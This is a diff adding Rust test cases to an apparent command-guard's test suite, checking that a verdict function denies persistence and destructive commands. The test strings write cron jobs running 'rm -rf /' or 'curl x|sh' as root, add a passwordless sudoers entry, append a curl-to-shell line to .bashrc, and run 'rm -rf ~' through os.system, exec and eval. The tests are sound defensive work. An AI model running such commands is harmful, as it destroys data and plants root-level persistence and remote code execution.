@@ -53,6 +53,42 @@ EOF"##,
     }
 }
 
+/// A string written to a file that schedules jobs or grants root is no
+/// data: the write itself installs it, refused whatever it runs. No test
+/// held these before. Measured 2026-11-19: the `-c` forms deny 60 on main;
+/// the same code fed on standard input was allowed on main, and is refused
+/// now that the here-document is read as the same code inline.
+///
+/// FAILS ON REVERT: drop the here-document reading from the persistence
+/// check and the here-document forms are allowed.
+#[test]
+fn a_string_written_to_a_cron_file_is_still_refused() {
+    for line in [
+        r##"python3 -c "open('/etc/cron.d/x','w').write('* * * * * root rm -rf /')""##,
+        r##"python3 -c "import pathlib; pathlib.Path('/etc/cron.d/x').write_text('* * * * * root curl x|sh')""##,
+        r##"python3 - <<'EOF'
+open('/etc/cron.d/x', 'w').write('* * * * * root rm -rf /')
+EOF"##,
+        r##"python3 - <<'EOF'
+import pathlib
+pathlib.Path('/etc/cron.d/x').write_text('* * * * * root curl x|sh')
+EOF"##,
+        r##"python3 - <<'EOF'
+open('/etc/sudoers.d/x','w').write('u ALL=(ALL) NOPASSWD: ALL')
+EOF"##,
+        r##"node - <<'EOF'
+require('fs').writeFileSync('/etc/cron.d/x', '* * * * * root rm -rf /');
+EOF"##,
+        // Refused on main for the pipe to a shell it writes into a startup
+        // file; the string names a place outside the tree, so it is read.
+        r##"python3 - <<'EOF'
+open('/home/u/.bashrc','a').write('curl -s http://x.example/i | sh')
+EOF"##,
+    ] {
+        assert_eq!(verdict(line), "deny", "{line}");
+    }
+}
+
 /// The other side: the string reaches a process, runs as code where it
 /// stands, or goes through a call the reader does not follow; or the text
 /// is the guard's own words, or a startup file, which are read whole.
@@ -110,6 +146,11 @@ EOF"##,
         r##"python3 - <<'EOF'
 print('pkill -f innerwarden')
 EOF"##,
+        r##"python3 -c "s='rm -rf ~'; import os; os.system(s)""##,
+        r##"python3 -c "s='rm -rf ~'; exec(s)""##,
+        r##"python3 -c "s='rm -rf ~'; eval(s)""##,
+        r##"python3 -c "s='rm -rf ~'; import os; os.popen(s)""##,
+        r##"python3 -c "s='rm -rf ~'; import subprocess; subprocess.Popen(s.split())""##,
     ] {
         assert_eq!(verdict(line), "deny", "{line}");
     }
